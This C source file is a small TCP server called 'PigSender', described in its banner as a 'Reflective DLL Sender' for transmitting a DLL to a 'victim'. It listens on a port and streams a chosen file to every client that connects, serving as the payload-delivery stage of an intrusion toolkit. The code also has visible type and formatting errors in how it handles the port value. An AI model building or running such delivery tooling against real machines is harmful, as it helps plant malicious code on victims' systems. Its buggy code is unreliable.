// PigSender 用于传输DLL到victim
// Auther @evilash

#include<netinet/in.h>  
#include<sys/types.h>  
#include<sys/socket.h>  
#include<stdio.h>  
#include<stdlib.h>  
#include<string.h>  
#include <unistd.h>


#define LENGTH_OF_LISTEN_QUEUE     20  
#define BUFFER_SIZE                287744 
#define FILE_NAME_MAX_SIZE         512  


char banner[7][50] = {"  ____  _       ____                 _           ",
						" |  _ \\(_) __ _/ ___|  ___ _ __   __| | ___ _ __ ",
						" | |_) | |/ _` \\___ \\ / _ \\ '_ \\ / _` |/ _ \\ '__|",
						" |  __/| | (_| |___) |  __/ | | | (_| |  __/ |   ",
						" |_|   |_|\\__, |____/ \\___|_| |_|\\__,_|\\___|_|   ",
						"          |___/                                  ",
						"   A Reflective DLL Sender v0.1    @evilash"

					  };

int main(int argc, char **argv)  
{  
	int ch;
	char* port;
    char* filename;
    char file_name[FILE_NAME_MAX_SIZE]; 

    if (argc == 1){
    	printf("%s\n%s\n%s\n%s\n%s\n%s\n%s\n\n", banner[0],banner[1],banner[2],banner[3],banner[4],banner[5],banner[6]);
    	printf("Usage:\n\n %s -f [filename] -l [ListenPort].\n",argv[0]);
    	exit(1);
    }
	//参数处理
	while ((ch = getopt(argc, argv, "f:l:h")) != -1) {
		switch (ch) {
			case 'f':

				filename = strdup(optarg);
				strcpy(file_name, filename);
				break;
			case 'l':

				port = strdup(optarg);
				port = atoi((const char *)port);
				break;

			case 'h':
				printf("%s\n%s\n%s\n%s\n%s\n%s\n%s\n\n", banner[0],banner[1],banner[2],banner[3],banner[4],banner[5],banner[6]);
				printf("Usage:\n\n %s -f [filename] -l [ListenPort].\n",argv[0]);
            	return -1;
            case '?':
            	printf("Usage:\n %s -f [filename] -l [ListenPort].\n",argv[0]);
            	return -1;
            default:
            	printf("Usage: %s -f [filename] -l [ListenPort].\n",argv[0]);
            	exit(1);
		}
	}

    // set socket's address information    
    struct sockaddr_in   server_addr;  
    bzero(&server_addr, sizeof(server_addr));  
    server_addr.sin_family = AF_INET;  
    server_addr.sin_addr.s_addr = htons(INADDR_ANY);  
    server_addr.sin_port = htons(port);  
    // create a stream socket    
    int server_socket = socket(PF_INET, SOCK_STREAM, 0);  
    if (server_socket < 0)
    {  
        printf("Create Socket Failed!\n");  
        exit(1);  
    }  
  
    // 把socket和socket地址结构绑定  
    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)))  
    {  
        printf("Server Bind Port: %s Failed!\n", port);  
        exit(1);  
    }  
  		
    // server_socket用于监听  
    if (listen(server_socket, LENGTH_OF_LISTEN_QUEUE))  
    {  
        printf("Server Listen Failed!\n");  
        exit(1);  
    }  
  
    // 服务器端一直运行用以持续为客户端提供服务  
    while(1)  
    {  
        // 定义客户端的socket地址结构client_addr，当收到来自客户端的请求后，调用accept  
        // 接受此请求，同时将client端的地址和端口等信息写入client_addr中  
        struct sockaddr_in client_addr;  
        socklen_t length = sizeof(client_addr);  
  
        // 接受一个从client端到达server端的连接请求,将客户端的信息保存在client_addr中  
        // 如果没有连接请求，则一直等待直到有连接请求为止，这是accept函数的特性，可以  
        // 用select()来实现超时检测  
        // accpet返回一个新的socket,这个socket用来与此次连接到server的client进行通信  
        // 这里的new_server_socket代表了这个通信通道  
        int new_server_socket = accept(server_socket, (struct sockaddr*)&client_addr, &length);  
        if (new_server_socket < 0)  
        {  
            printf("Server Accept Failed!\n");  
            break;  
        }  
  
        char buffer[BUFFER_SIZE];  
        //bzero(buffer, sizeof(buffer));     
        
        printf("[+]Sending DLL\n");
        //bzero(file_name, sizeof(file_name));
        //strncpy(file_name, buffer, strlen(buffer) > FILE_NAME_MAX_SIZE ? FILE_NAME_MAX_SIZE : strlen(buffer));  
		sleep(3);
        //strcpy(file_name, filename);

        FILE *fp = fopen(file_name, "r");  
        if (fp == NULL)  
        {  
            printf("File:%s Not Found!\n", file_name);  
        }  
        else  
        {  
            bzero(buffer, BUFFER_SIZE);  
            int file_block_length = 0;  
            while( (file_block_length = fread(buffer, sizeof(char), BUFFER_SIZE, fp)) > 0)  
            {  
                printf("[+]file_block_length = %d\n", file_block_length);  
  
                // 发送buffer中的字符串到new_server_socket,实际上就是发送给客户端  
                if (send(new_server_socket, buffer, file_block_length, 0) < 0)  
                {  
                    printf("Send File:\t%s Failed!\n", file_name);  
                    break;  
                }  
  
                bzero(buffer, sizeof(buffer));  
            }  
            fclose(fp);  
            printf("[+]File:%s Transfer Finished!\n", file_name);  
        }  
  
        close(new_server_socket);  
    }  
  
    close(server_socket);  
  
    return 0;  
}
